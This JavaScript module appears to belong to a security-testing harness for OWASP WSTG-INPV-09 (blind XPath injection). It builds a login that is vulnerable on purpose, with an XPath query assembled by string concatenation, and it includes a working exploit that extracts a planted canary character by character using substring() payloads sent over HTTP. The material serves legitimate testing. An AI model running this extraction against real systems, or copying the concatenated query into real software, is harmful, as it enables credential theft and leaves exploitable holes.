// WSTG-INPV-09 (4.7.9) — Blind XPath Injection behaviour.
// A login runs a string-concatenated XPath query against an in-memory XML user
// store (real xpath + @xmldom/xmldom). It is injectable, but the response is
// binary — "Access granted" if the query matches ≥1 node, otherwise "could not
// be verified" — and never echoes a record. So the attacker extracts the admin
// account's secret one character at a time via substring() boolean conditions,
// reading only the auth/no-auth signal (blind XPath).

import crypto from 'node:crypto'
import xpath from 'xpath'
import { DOMParser } from '@xmldom/xmldom'
import { Scenario } from './scenario.mjs'

let DOC = null
function buildDoc(scenario, canary) {
  if (DOC) return DOC
  const esc = s => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
  const rnd = () => crypto.randomBytes(6).toString('hex')
  // admin first; its <account> holds the canary. Decoys carry benign accounts.
  const rows = [
    `<user><username>${esc(scenario.adminUsername)}</username><password>${rnd()}</password><account>${esc(canary)}</account></user>`,
    ...['support', 'jdoe', 'operations'].map(u =>
      `<user><username>${u}</username><password>${rnd()}</password><account>acct-${rnd()}</account></user>`),
  ]
  DOC = new DOMParser().parseFromString(`<users>${rows.join('')}</users>`, 'text/xml')
  return DOC
}

// Core auth check: build the vulnerable query and return whether it matches a
// node. Malformed (injection syntax error) -> not authenticated, same as wrong
// creds (no error side channel).
function isAuthenticated(doc, username, password) {
  const query = `//user[username/text()='${username}' and password/text()='${password}']`
  try {
    const nodes = xpath.select(query, doc)
    return Array.isArray(nodes) && nodes.length > 0
  } catch {
    return false
  }
}

// Reference blind extraction: pull the admin account field char-by-char using a
// boolean probe. probe(username, password) -> Promise<boolean authenticated>.
export async function extractBlind(adminUsername, probe, maxLen = 64) {
  const charset = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
  let secret = ''
  for (let pos = 1; pos <= maxLen; pos++) {
    const hits = await Promise.all([...charset].map(async (c) => {
      // username='zz' OR <bool> OR ('a'='b' AND password=...) ; `and` binds
      // tighter than `or`, so the predicate reduces to <bool>.
      const bool = `substring(//user[username/text()='${adminUsername}']/account/text(),${pos},1)='${c}'`
      const u = `zz' or ${bool} or 'a'='b`
      return (await probe(u, 'zz')) ? c : null
    }))
    const c = hits.find(Boolean)
    if (!c) break
    secret += c
  }
  return secret
}

export const classDef = {
  wstgId: 'WSTG-INPV-09',
  class: 'Blind XPath Injection',
  defenceTiers: [0],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.endpoint.path,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.endpoint.path),

  matchesRequest({ reqUrl, scenario }) {
    return reqUrl.pathname === scenario.endpoint.path
  },

  async handleRequest({ req, scenario, helpers, renderPage, manifest }) {
    if (req.method !== 'POST') return { status: 200, body: renderPage(loginForm(scenario)) }
    const form = new URLSearchParams(helpers.rawBody || '')
    const u = form.get('username') || ''
    const p = form.get('password') || ''
    const doc = buildDoc(scenario, manifest.perDeployCanary)
    // VULNERABLE: input concatenated into the XPath query. Response is binary
    // and never renders a record — the canary is only inferable blindly.
    if (isAuthenticated(doc, u, p)) {
      return { status: 200, body: renderPage('<section style="max-width:480px;margin:0 auto"><h2>Access granted</h2><p>You are signed in. Your workspace is loading…</p></section>') }
    }
    return { status: 200, body: renderPage(loginForm(scenario, 'Those credentials could not be verified.')) }
  },

  async fireExploit({ baseUrl, scenario, helpers }) {
    const url = `${baseUrl}${scenario.endpoint.path}`
    const sleep = (ms) => new Promise(r => setTimeout(r, ms))
    const probe = async (u, p) => {
      let lastErr
      for (let attempt = 0; attempt < 6; attempt++) {
        try {
          const r = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `username=${encodeURIComponent(u)}&password=${encodeURIComponent(p)}`,
            redirect: 'manual',
          })
          const t = await r.text()
          return /Access granted/i.test(t)
        } catch (e) { lastErr = e; await sleep(100 * (attempt + 1)) }
      }
      throw lastErr
    }
    const secret = await extractBlind(scenario.adminUsername, probe)
    return { status: 200, body: secret }
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    responseBody.includes(perDeployCanary),
}

// Exposed for the in-process self-test.
export const __test = { buildDoc, isAuthenticated }

function loginForm(scenario, err) {
  return `<section style="max-width:420px;margin:0 auto">
  <h2 style="font-size:20px;margin:0 0 8px">Sign in</h2>
  <p style="color:#666;margin:0 0 12px">${escapeHtml(scenario.loginIntro)}</p>
  ${err ? `<p role="alert" style="color:#b00;margin:0 0 12px">${escapeHtml(err)}</p>` : ''}
  <form method="POST" action="${scenario.endpoint.path}" style="display:flex;flex-direction:column;gap:10px">
    <label>Username<input name="username" autocomplete="username" style="display:block;width:100%;padding:8px"></label>
    <label>Password<input name="password" type="password" autocomplete="current-password" style="display:block;width:100%;padding:8px"></label>
    <button type="submit" style="padding:9px 14px">Sign in</button>
  </form>
</section>`
}
function escapeHtml(s) {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}
